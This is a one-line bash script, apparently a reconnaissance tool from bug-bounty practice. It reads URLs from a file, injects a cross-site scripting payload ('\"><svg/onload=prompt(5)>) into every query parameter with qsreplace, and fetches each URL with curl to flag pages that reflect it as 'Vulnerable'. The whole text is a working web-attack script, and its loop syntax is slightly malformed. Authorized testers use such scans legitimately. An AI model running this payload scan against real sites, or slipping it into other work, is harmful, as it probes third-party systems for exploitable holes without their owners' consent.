echo -e "\n"; cat xss.txt | grep '=' | qsreplace "'\"><svg/onload=prompt(5)>" |  while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<svg/onload=prompt(5)>" && echo -e "\033[0;36m$host \033[0;31m" Vulnerable;done; echo -e "done"